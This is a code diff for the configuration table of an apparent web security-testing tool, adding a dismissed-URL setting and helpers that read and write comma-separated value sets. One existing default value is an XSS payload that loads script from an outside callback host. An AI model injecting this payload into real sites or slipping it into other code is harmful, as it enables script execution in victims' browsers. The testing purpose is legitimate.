@@ -26,6 +26,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("DismissedUrl", "",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 		
@@ -99,11 +100,41 @@ public class ConfigTableModel extends AbstractTableModel{
 		return null;
 	}
 
+	public Set<String> getConfigValueSetByKey(String key) {
+		Set<String> result = new HashSet<String>();
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getKey().equals(key) && entry.isEnable()) {
+				String tmp = entry.getValue();
+				String[] tmpArray = tmp.split(",");
+				result.addAll(Arrays.asList(tmpArray));
+			}
+		}
+		return result;
+	}
+
 	public void setConfigByKey(String key,String value) {
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getKey().equals(key)) {
 				int index = configEntries.indexOf(entry);
 				entry.setValue(value);
+				configEntries.set(index,entry);
+				fireTableRowsUpdated(index,index);
+			}
+		}
+	}
+
+
+	public void setConfigValueSetByKey(String key,Set<String> vauleSet) {
+		for (ConfigEntry entry:configEntries) {
+			if (entry.getKey().equals(key)) {
+				int index = configEntries.indexOf(entry);
+
+				String valueStr = vauleSet.toString();
+				valueStr = valueStr.replace("[", "");
+				valueStr = valueStr.replace("]", "");
+				valueStr = valueStr.replaceAll(" ","");
+
+				entry.setValue(valueStr);
 				configEntries.set(index,entry);
 				fireTableRowsUpdated(index,index);
 			}
